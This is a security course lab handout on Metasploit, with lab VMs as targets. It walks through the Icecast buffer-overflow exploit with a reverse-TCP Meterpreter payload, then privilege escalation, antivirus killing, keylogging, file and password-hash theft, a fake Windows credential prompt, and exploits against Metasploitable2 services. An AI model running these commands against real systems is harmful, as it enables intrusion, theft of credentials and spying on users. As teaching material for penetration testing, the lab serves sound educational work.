In this lab, you will use Metasploit to exploit and take control of a Windows VM
and the Metasploitable2 VM you scanned in the previous lab.



# Metasploit

Metasploit is the industry’s most popular exploitation tool. According to [Sectools.org](https://sectools.org):

> Metasploit took the security world by storm when it was released in 2004. It is an advanced open-source platform for developing,
testing, and using exploit code. The extensible model through which payloads, encoders, no-op generators, and
exploits can be integrated has made it possible to use the Metasploit Framework as an outlet for cutting-edge exploitation research.
It ships with hundreds of exploits, as you can see in their list of modules. This makes writing your own exploits easier,
and it certainly beats scouring the darkest corners of the Internet for illicit shellcode of dubious quality.

> Metasploit was completely free, but the project was acquired by Rapid7 in 2009 and it soon sprouted commercial variants.
The Framework itself is still free and open source, but they now also offer a free-but-limited Community edition, a more
advanced Express edition ($3,000 per year per user), and a full-featured Pro edition ($15,000 per user per year). Other
paid exploitation tools to consider are Core Impact (more expensive) and Canvas (less).



## Metasploit Interfaces

The Metasploit framework has a variety of different interfaces, including the command line tool `mcli` and `meterpreter`, an interface designed to
interact with compromised computers. You can even work from an interactive Ruby programming language interpreter within Metasploit
(Metasploit is written in Ruby). However, the most popular interface, and the one we will use chiefly in this lab, is `msfconsole`.
Msfconsole is an interactive environment that allows you to scan hosts, test and launch exploits, and build and deploy payloads.



## Terminology

Below is a list of common terminology relating to Metasploit, taken (with some adaptation) from Metasploit: The Penetration Tester’s Guide, by Kennedy et al.

Exploit
: The means by which an attacker takes advantage of a flaw within a system, an application or service. An exploit results in a particular
outcome unintended by the original developer. Common exploits include buffer overflows, web application vulnerabilities (like SQL injection), and configuration errors.

Payload
: Code that the attacker wants the system to execute and that is selected and delivered by Metasploit. For example, a reverse shell is a payload that
creates a connection from the target machine back to the attacker as a command prompt, whereas a bind shell is a payload that “binds” a
command prompt to a listening port on the target machine, to which the attacker can then connect. A payload could also be
something as simple as a few commands to be executed on the target operating system.

Module
: A module in the context of Metasploit is a piece of software that can be used by Metasploit. At times, you may require the use of an exploit module, a
software component that conducts the attack. Other times, an auxiliary module may be required to perform an action such as scanning or system enumeration.
These interchangeable modules are the core of what makes Metasploit so powerful.

Listener
: A component within Metasploit that waits for an incoming connection of some kind. For example, after the target machine has been exploited,
it may call the attacking machine over the Internet. The listener handles that connection, waiting on the attacking machine to be contacted by the exploited system.

# Part 1: Exploit Windows via Icecast Vulnerability

In this lab, imagine that the Windows VM is a machine that you desire to exploit.
The Windows user is operated by a person named Labuser, who has installed a media
streaming server, Icecast, so that he and his coworkers can listen to his music.
Unfortunately, the version of Icecast that Labuser has installed is vulnerable
to a [buffer overflow attack](https://owasp.org/www-community/vulnerabilities/Buffer_Overflow), to which all versions of Icecast version 2.01 and
earlier were vulnerable.
[See the exploit information here](https://www.rapid7.com/db/modules/exploit/windows/http/icecast_header).
Old versions of Icecast can be found [here](https://ftp.osuosl.org/pub/xiph/releases/icecast/).

Also unfortunately, Labuser has completely disabled every single known
security feature of his operating system, including but not limited to:

  * Windows Defender
  * Windows Firewall
  * Buffer overflow protection  

For this section of the lab, you will play both the role of the Windows user,
and also of a nefarious attacker.


## Start Icecast as admin

1.  Launch the Windows virtual machine. Log in to it as user `Labuser`,
    password `Passw0rd!`.

    If you are asked to provide a reason for an unexpected shutdown, you can
    ignore (cancel) this dialog. It is a Windows Server logging feature.

1.	On Windows desktop, right-click the "Icecast2 Win32" icon.
    <span class='badge badge-danger'>Important!</span> Select “Run as administrator.”
    If any warning message pops up, click “yes”.

    Running as Administrator will change the permissions that are obtained when
    the program is exploited.
2.	In the Icecast window that appears, click the button “Start server.”

    **Note**: The Icecast server is configured by default to a max of 5 connections.
    Each time you exploit the Icecast server, the connection count will tick up
    by one. If you use up all connections, simply kill and restart the Icecast server.


## Start msfconsole

In Kali, from a terminal, enter:

    msfconsole

You should see a “msf >” prompt appear. This is the Metasploit command line.


## `nmap` Scan Windows

Scan the Windows VM for vulnerabilities using `nmap`

    nmap -sV <ip of Windows>

Notice that Icecast is running on port `8000`. Could there be an exploit for
Icecast built into Metasploit? Let's check!


## Finding and using an icecast exploit

4.  From the `msf >` prompt, try:

        search name:icecast

5.  In the search output, you should see an exploit related to `icecast` called `exploit/windows/http/icecast_header`. Use it:

        use exploit/windows/http/icecast_header

    <div class='alert alert-info'><strong>Note:</strong> You can press the tab key within Metasploit to complete a module or command name you are typing. This makes entering commands in Metasploit faster. If you push the tab key twice it should show you all possible options for directory you are in.</div>

6.	Your msfconsole prompt should now look like this:

        msf exploit(icecast_header) >

    Indicating that the `icecast_header` module is loaded.

7.	To get more information about this exploit module, type `info`.

    This module has been rated “great,” meaning it is very effective and reliable.

    Besides providing a better description, the `info` command shows the targets
    that the module is effective against, as well as options to set.

8.	To show available options, type `show options`.

    Notice that some options are "required."

9.	Let’s set the required options.

    First, we’ll set the remote host:

        set rhost <IP address of your Windows VM>

    Type `show options` again to verify that the RHOST variable has been set.

10.	Next, let’s look at available payloads for this exploit:

        show payloads

11.	We have a lot of payload options for this module. We’ll use one of the most
    popular and reliable payloads -- a Meterpreter shell. Type:

        set payload windows/meterpreter/reverse_tcp

    Meterpreter is a shell, like Bash, except it is malware.

    This specific
    payload will open a _reverse TCP connection_, **from** the exploited Windows
    VM back **to** the Kali VM, effectively punching through most external-facing
    firewalls. Often, firewalls defend more fiercely what comes in than what goes
    out. This is why it is important that you are able to reach Kali from Windows,
    and Windows from Kali.

12.	Type `show options` again to see the options that are required for this payload.

13.	Set the "local host" variable to Kali's IP address on the infosec-net adapter.
    To set the local host variable, type

        set lhost <IP address of the Kali machine>

    A `lhost` was likely set for you by default -- but it may be an address for
    an incorrect interface! Make sure this setting is correct.

    <div class='alert alert-info'><strong>Note:</strong> Remember that you can
    easily check your IP in Unix/Linux by typing <code>ifconfig</code> or
    <code>ip</code> from within Metasploit.</div>

    {: #set-lhost-iface-name }
    **Note!** msfconsole allows you to specify an interface name as the `lhost`.
    The interface name for infosec-net is `virbr1`. You could set this as follows:

        set lhost virbr1


    Type `show options` to see that the variable has been set.


13. {: #setg } For convenience, set values for some of these settings to the global msfconsole
    datastore using the `setg` command. For example (verify addresses!):

        setg RHOST 192.168.56.100
        setg RHOSTS 192.168.56.100
        setg LHOST 192.168.56.101

    Then, run the msfconsole `save` command to have these values loaded for new
    msfconsole sessions.

    You should still verify that settings are correct before `run`-ing any
    exploits. Not all modules will draw from the global datastore.


14.	With all options set, now it’s time to <span class='badge badge-danger'>
    <i class='fa fa-rocket'></i> launch the exploit!</span> Type:

        exploit

    (Or equivalently, `run`, but that's less fun.)

15. You should now be presented with the `meterpreter >` prompt. If you see this,
    then <i class='fa fa-birthday-cake'></i> congratulations! You’ve exploited
    your first remote host.

16. Laugh maniacally.

For reference, here is a summary of the `msfconsole` commands you just ran.
These commands assume that you've run the above `setg` commands.

```
use exploit/windows/http/icecast_header
set payload windows/meterpreter/reverse_tcp
exploit
```

# Part 1.2: Use Meterpreter to Explore the Windows host

Now, let's explore your newfound power. You are operating
malware -- meterpreter -- that is running on a remote, compromised host. Run a few
commands to give an idea of the power of the meterpreter interface.

1.  To see all possible Meterpreter commands, type `help`.
1.  Don't do this now, but you can close a meterpreter session with the `exit`
    command. Alternatively, you can suspend your session so you can return to it
    again later with the `background` command (or by pressing `ctrl+z`).
1.  Type `sysinfo` to see information about the compromised system.
1.  Type `getuid` to see which Windows user account your session is running as.

    You will see that you are running as `Labuser`. But you want more power. You
    want to become SYSTEM -- the windows equivalent of the *nix "root" user.

    Because Icecast was "run as administrator", we can easily become SYSTEM --
    the Windows equivalent of "root". Escalate your privileges by typing `getsystem`.

    Type `getuid` again. You should see that you have “NT AUTHORITY\SYSTEM,”
    which means you administrator privileges.

    Now that you are SYSTEM, laugh again.

The following are <span class='badge badge-info'>non-sequential</span> exploration
activities you might carry out. You should be able to try them in <span class='badge badge-info'>any
order.</span>

## Kill AV

With a Meterpreter shell, you have access to a trove of post-exploit modules
included in the Metasploit framework that you can run on the victim machine.
For instance, type:

    run post/windows/manage/killav

to stop anti-virus processes that might limit our attacks on the machine.

(There are none running on this virtual machine.)


## Screenshot

Type `screenshot` to capture a screenshot of the current GUI. A jpeg file
should be saved to `/root` on your Kali machine. You can view the image from
a different shell in Kali by navigating
to the directory of the stored image and viewing it with `mirage [image name]`.


## VNC payload

Control the Windows GUI.

**Heads up!** The VNC payload is unreliable. See the troubleshooting note at the
bottom of this section.

From meterpreter, type `background`  or `cntl+z`. This sends the current
meterpreter session to the background so you can do more things in the
Metasploit console.

For this, we will use a different payload -- the `vncinject` payload.

    set payload windows/vncinject/bind_tcp

Type `show options`. Change the "ViewOnly" option to `false`

    set ViewOnly false

Run `exploit` anew.

A new window should open on Kali Linux that will let you control the Windows VM
using the mouse. <span class='badge badge-success'>You are now controlling the
Windows user interface!</span> Whatever you do, the logged-in user will see!
Trying moving a window on the Windows VM. Then, close the VNC window on the Kali
VM. Because you closed the VNC window, the exploit terminated.

Once you are done playing with VNC access, switch back to a meterpreter session.
From `msfconsole`, run `sessions -l` to view all running
connections. You should see a list of your sessions, including your meterpreter
session, along with its `id`. Interact with that session again by running `sessions <the id of the session>`.
Your prompt should change, and you should be engaged with the meterpreter session again.

<div class='alert alert-info'>
  <strong>Heads up!</strong>

  <p>This exploit, while
  fun, is not very reliable.</p>
  <p>If it doesn't work for you, then try changing the VNCPORT to something besides
  5900 (perhaps 5901?). There might be left-over services listening on kali on these
  ports, so just try a different one. Failing that, try things like the following:</p>
  <p>

  <ol>
    <li>"Stop"-ing and "start"-ing again the Icecast server</li>
    <li>Restarting your msfconsole session</li>
    <li>Trying the tcp_bind variant, etc.</li>
  </ol>

  <p>It's not a big
  deal if you can't get this to work -- <strong>feel free to skip it</strong>.
  In fact, it's good practice dealing with
  the uncertainty and frustration of exploits not always working. After all,
  this <em>is malware</em> we're using here! No guarantees!</p>
</p>

</div>


## Keylogger    

Start a keylogger on the victim's computer. Type `keyscan_start`. Now, from
the Windows machine, open Notepad.exe and type some secrets. They are no
longer secrets.

Back in meterpreter, type `keyscan_dump`.
You should see the text you typed in Notepad. To stop the keylogger, type `keyscan_stop`.


## Steal files

Steal a file—download a file from Windows to Kali.

As the Labuser, use Notepad to create a text document on the Desktop of
the Windows machine. Put some secrets in it.

From the meterpreter session, use the `cd` command within Meterpreter to
navigate to the victim desktop. For that, you can either use the Windows
path specification, with double back-slashes:

    cd c:\\users\\Labuser\\desktop

... or you can use linux path specification:

    cd /Users/Labuser/desktop

Now type `ls` to see what you might pilfer.

Snag the secrets file.

    download [filename to steal]

The file should now be pilfered, saved to the Kali VM at `/root`.

You can also use the `search` command from within meterpreter to find the
location of the secrets file:

    search -f [name of your secrets file].txt



## Annoy the user

Rather than steal secrets, let's switch to pestering Labuser.

First, from meterpreter, disable their keyboard and mouse:

    uictl disable all

Then, play a video for them. We'll use the `play_youtube` post module. Read about it from within meterpreter:

    info post/multi/manage/play_youtube

The default youtube video set for this postmodule is excellent, but you can
optionally swap it out for one of your choosing. From your laptop or whatever,
select your favorite annoying youtube video. Note the url of the video -- it
will include a `v=[video id]` in it. Copy the video id. For example,
one video id is `DLzxrzFCyOs`. Let's play this video, setting VID to your
video. e.g.:

    run post/multi/manage/play_youtube VID=DLzxrzFCyOs

Switch over to the Windows VM and enjoy being annoyed by the video.
Close the video --oh wait you can't, your keyboard and UI access were disabled!
You are powerless!

As the attacker, let up on your shenanigans. From meterpreter, reenable
ui controls:

    uictl enable all

<div class='alert alert-info'>
  <p>
    <strong>Pop-up says "Video not available"?</strong>The documentation for this postmodule
  says the following: "Enabling the EMBED option will play the video in full screen mode through a clean interface
  but is not compatible with all videos." Try disabling EMBED by calling the module like this:
  </p>
  <p>
    <code>run post/multi/manage/play_youtube VID=DLzxrzFCyOs EMBED=false</code>
  </p>
</div>


## Steal hashes

Back to secret-stealing.

Because you `getsystem`'ed earlier, you can obtain the password hashes for
the machine by typing `run post/windows/gather/hashdump`.
These hashes can be readily cracked using a password cracker like Hashcat or
John the Ripper (covered in the password cracking lab).
For now, we’ll use Google to crack the password hash for user `vagrant`.

**Note:** hashdump command outputs hashes in the following format:

    username:SID:LANMAN hash:<NTLM hash>:::

For example, in the following hashdump, the NTLM hash is `C1F1B7BDB01896908C80A0A67062BF24`:

    Frank:1000:3A956F63F23DAC7236077A718CCDF409:C1F1B7BDB01896908C80A0A67062BF24:::

Copy the NTLM hash that you obtain from `hashdump` for the `Vagrant` user. Open a web browser, and visit a site like
[https://crackstation.net](https://crackstation.net) or
[https://hashkiller.co.uk](https://hashkiller.co.uk/Cracker/NTLM), and let
it crank on your hash.
These sites use rainbow tables to quickly look up corresponding plaintext
password for a submitted hash.

Alternatively, try to crack it on your own using `hashcat` with `-m 1000`
(NTLM) and a wordlist like rockyou. Go on, it's fun!

{% include lab_question.html question='What is the NTLM hash of the user
<code>vagrant</code>?' %}


## Migrate processes

Right now, your meterpreter sessions is tied to the Icecast process.
This means that if Icecast is closed, you lose your shell. Let's mitigate
that threat by migrating to another,
more permanent Windows process that is at less risk of being closed down.

Type `ps -S Icecast` (note the capital ‘S’ argument and the capital 'I'
in Icecast) to search for processes with the name of “Icecast.” Note the
process ID. Next, type `getpid` to get the process that
meterpreter is running off of. It should be the same process ID as Icecast.
This confirms that you are tied to Icecast.

Now, run this post module, which by default will spawn a hidden `notepad.exe`
process, and migrate you to it:

    run post/windows/manage/migrate

Now, close the Icecast window. Your meterpreter session should still be
running. _Congratulations, you have Persisted_.


## Steal chrome saved passwords

<div class='alert alert-info'><strong>Sorry, closed for maintenance.</strong> This section used to have
you steal passwords from Chrome's secure storage, but in March 2020, Chrome changed
the way that their passwords are encrypted, and the <a class='alert-link' href='https://github.com/rapid7/metasploit-framework/issues/13113#issuecomment-707961781' class='alert-link'>metasploit enum_chrome
postmodule has not yet been updated</a>,
so this attack won't work.</div>


## Open Windows command prompt

You can execute commands on the victims host from within Meterpreter. For example, type:

    execute -f cmd.exe -c

This will launch cmd.exe on the victim’s machine. You can hide the command
window from being shown on the victim machine by using the `-H` option.

The `-c` option “channelizes” the cmd.exe, which means that meterpreter can
continue interacting with it. Notice the message that “Channel 1 was created.”

Interact with cmd.exe by typing: `channel -i 1`. Use the `dir`, `cd`, and
`cd ..` commands to browse around the file system. Type `exit` to return to
meterpreter.

<div class='info info-alert'>Since opening a command prompt is such a common
action, you can simply type <code>shell</code> to open a hidden command prompt.</div>


## Phish windows login credentials

Fake-prompt the Windows user for their password. From meterpreter, type:

    run post/windows/gather/phish_windows_credentials

On Windows, you should see a legitimate Windows prompt, triggered by PowerShell
code run by meterpreter on the victim machine, asking for the user to enter their
password. This prompt will _not_ go away
until the user enters their correct password. Enter the password.

On Kali, in meterpreter, you should see the harvested username and password.

{% include lab_question.html question="Submit a screenshot showing you running
the <code>phish_windows_credentials</code> postmodule, the harvested username
and password, then dropping into a shell and echoing your name and the
current date (see example screenshot below)" %}

{% include lab-image.html image='exploit-lab-phish-credentials.png' %}


# Part 2: Metasploitable2 Discovery

The Windows machine sufficiently pwned, it is now time to turn our attention
to pwning Metasploitable2.

<div class='alert alert-danger'><strong>Take Note!</strong> This section attacks
Metasploitable2, <em>not</em> the Windows machine! As such, it can be done
<em>completely independently</em> of Part 1. You do not need to have exploited Windows
to do these steps.</div>

<div class='alert alert-danger'><strong>Heads up!</strong> This section is
intentionally vague at points, for the sake of your learning. It presumes that
you have already learned the specifics of certain steps from the Windows
exploitation section of this lab.</div>

Start the Metasploitable2 VM. (You can shut down the Windows virtual machine now.)

## Start with recon
Start with reconnaissance -- a repeat of steps from the vulnerability scanning
lab. Do a wide sweep to check which ports are open on the Metasploitable2 VM:

    nmap -sS 192.168.56.102

And check versions for common ports:

    nmap -sV 192.168.56.102

Versions for _all_ ports:

    nmap -sV -p1-65535 192.168.56.102

Versions for one specific port:

    nmap -sV -p80 192.168.56.102

## Attack a service
Picking a random service, note that the service "vsftpd" is running on
port 21. Could there exist a metasploit vsftpd exploit?
In Kali, from a `msfconsole` prompt, search for a vsftpd exploit:

    search vsftpd

Yes, there is one. Select (`use`) the exploit, and set any necessary options
(`show options`). Check available payloads:

    show payloads

You will see that a meterpreter shell payload is not available for this exploit.
Instead, only a very basic unix shell payload is available.

Run the exploit.

**What follows next is maddening, but at least it is consistent.**

Your first run will report that the exploit was successful but no session
was established. Huh?

Run it again. The exploit will report that a listener was already found! It
will connect to it, and you will get a session! But the experience is
different from the Meterpreter session -- with this one, you will see a
final line saying something along the lines of "Command shell session opened..."
followed by... nothing. Did the exploit fail? No! You have a shell, albeit
a very basic one.

<div class='alert alert-info'><strong>Heads up!</strong> Now, if you close the
opened session (that's <em>close</em>, not <em>background</em>) --
you will not be able to get another session via this exploit, <em>unless you
restart Metasploitable2.</em> Take note! :shrug:</div>

From your basic, prompt-less shell, type `id` to see who you are. Type other
familiar commands, such as `ls`, `pwd`, and `cat [filename`]. You do not
have tab-completion, sadly. Although you do have a few basic metasploit-aware
commands. Run:

    help

Notice that you have `download` and `upload` commands. This can be useful
to steal files without having to use `scp`. However, you cannot run Metasploit
postmodules from within this kind of shell.

Let's fix that -- by _upgrading_ this session to a meterpreter session.

1.  `background` your session. This will return you to the msfconsole prompt.
2.  Select (i.e., `use`) the following postmodule:

        use post/multi/manage/shell_to_meterpreter

    This command will use our first shell to upload and initiate a meterpreter
    shell session.

    Once you have this postmodule selected, type `show options`. Set the
    needed options, including the session number for the background session.

    Launch (`run`) the post-module. A new meterpreter session should be created.
    Find the session id of this new sessions (run `sessions`), and interact
    with it (`sessions [sessionid]`).

    Type `help` again. You now have more meta-commands available than before,
    including access to postmodules from the shell.

3.  Let's `hashdump` metasploitable2. This will give you a list of usernames
    and password hashes. You could later crack these hashes on Kali.

    From your meterpreter session:

        run post/linux/gather/hashdump

    This will print all usernames and hashes to the console. It will also
    save the information to a file in the `/root/.msf4/loot/` folder.
    Make sure you take note of the location of this file -- you could crack
    the hashes in it with a tool like *hashcat* or *john the ripper*.
    View the contents of the file in a separate kali terminal by `cat`-ing it.

    <div class='alert alert-info' markdown='1'>

    You technically do not have to upgrade to a meterpreter session to run the
    postmodules. You can alternatively run the postmodules using the basic shell
    session from the msfconsole. To
    do so, you would select the postmodule as you would an exploit:

        use post/linux/gather/hashdump

        show options

        set session [sessionid of basic unix shell]

    This will execute the postmodule over the basic shell session.

## Exploitation Exploration: Samba Example

<div class='alert alert-warning'><strong>Take heed!</strong> This section is intentionally even more vague than the last.</div>

Recall that the general strategy for exploitation requires:

1. Service enumeration and version recon
2. Exploit identification

If you run `nmap` against metasploitable2, you will get a long list of running
services. If you include the `-sV` flag, you will get some version information.
However, the nmap version probes can only gain so much insight. Some services require
you to use other methods to do version recon, such as connecting to the
service using an app that can speak the service protocol (i.e., `hexchat` to connect to
the IRC chat client).

You can use what you know about the running service, including its name, to search for
exploits. Metasploit's built-in search functionality is a bit cumbersome and
obtuse, and many prefer to install `exploitdb` to get access to the `searchsploit`
command, which has more intuitive search functionality and nicer reporting and which
includes non-Metasploit exploits as well (any available on [exploit-db.com](https://www.exploit-db.com/)).
But you should be able to get by with the basic Metasploit
search functionality with some trial-and-error and deductive reasoning.

For instance, if `nmap -sV` reported that a service called `Samba smdb 3.X -
4.X` was running on ports `139` and `445`, and you wanted to search for an
exploit for it, you might use some of that version information as keywords in a
msfconsole search:

    search sambda smdb 3.X - 4.X

(Try it!)

This only returns one result, and it is for an "auxiliary" module, not an exploit.

Let's broaden our search to find some exploits:

    search samba

This would return a _lot_ of results! We need to filter.

Run `search` to see how we might refine our query. The help docs report that we
can filter by `type:<type>` and also by `name:<name>`, where the default is to
just search by keyword, where the term can appear _anywhere_ in the exploit
file.

So, filter down to just exploits via `type:exploit`:

    search name:samba type:exploit

That's _still_ a lot of results! How can we filter them?

* Note that the results list the rank of these exploits (how well they work/how reliable they are).
* Also note that looking through the exploits, we can see what "platform" (operating system) they work on. For example, "multi" in the exploit `exploit/multi/samba/usermap_script` means that it can work on multiple platforms. But there are quite a few that only work on specific platforms.

Looking again at the help docs, we see that we can filter by `rank:<rank>` and `platform:<platform>`. Let's use these filters to only show exploits for Linux machines that are ranked "excellent":

    search name:samba rank:excellent type:exploit platform:linux

Hooray, we have narrowed our results down to a single exploit!

Remember, attackers only need to get in _once_ in order to proceed. Defenders have
it harder in this regard.

<div class='alert alert-info'><strong>Tip!</strong> Remember, you can always
google version names along with terms like "exploit" and "msfconsole" to see
what comes up.</div>

## Exploitation Exploration: On Your Own

In this section, you will exploit three of <span class='badge badge-info'>the following additional service</span>.

<div class='alert alert-warning'><strong>Oh no!</strong> This section is a vague
as they come. But there still are hints.</div>

Now, exploit three additional services from the following list, using what you
learned above.

* 1099 \| RMIRegistry
    * set `srvhost` to kali's infosec-net ip address.
* 1524 \| bindshell
    * this is a backdoor shell set up on Metasploitable2, just waiting for a connection…
    * easy way, skip Metasploit and use `netcat` (`nc`)
        * Read basic docs on `nc` -- flex your self-learning muscle!
    * Metasploit way:
        * `use exploit/multi/handler`
        * `set payload generic/shell_bind_tcp`
        * `set lport 1524`
        * `set rhost 192.168.56.102`
* 6667 \| unrealircd
    * to get the precise version number, connect to the IRC server running on metasploitable2.
        * `apt install hexchat`
        *  run `hexchat`
        * Networks > Add > (name it whatever) > Edit >
          replace `newserver/6667` with `192.168.56.102/6667`
        * connect
        * precise version number will be reported by the server in the chat window
        * search msf db for an exploit for the server name/version
* 8180 \| tomcat
    * tomcat is running on port 8180
    * view by browsing to `192.168.56.102:8180`
    * need manager creds 192.168.56.102:8180/manager/html
    * bruteforce tomcat manager username:password with auxiliary/scanner/http/tomcat_mgr_login
    * once you have the tomcat mgr username:password, exploit (`search type:exploit name:tomcat`)
    * set httpusername and httppassword
    * don't forget to set port


## Part 2 Deliverable

For <span class='badge badge-success'>each of the three additional exploits</span>, take <span class='badge badge-info'>one</span> screenshot showing:

* running the exploit and obtaining a shell,
* interacting with that shell (if not done automatically),
* if dropped into a meterpreter session, dropping into a basic shell via the meterpreter `shell` command
* running the `date` command (don't worry about the date being a few days off due to metasploitable2 lagging)
* running `echo <your first and last name>` command.

### Example -- Screenshot 1 out of 3:

This example screenshot is for Windows -- <span class='badge badge-danger'>But your examples all must show exploitation of Metasploitable2</span>. Nevertheless,
the example shows (1) running the exploit and getting a meterpreter shell, (2) dropping into a cmd shell, (3) running the windows equivalent of the `date` command, and (4) echoing a name.
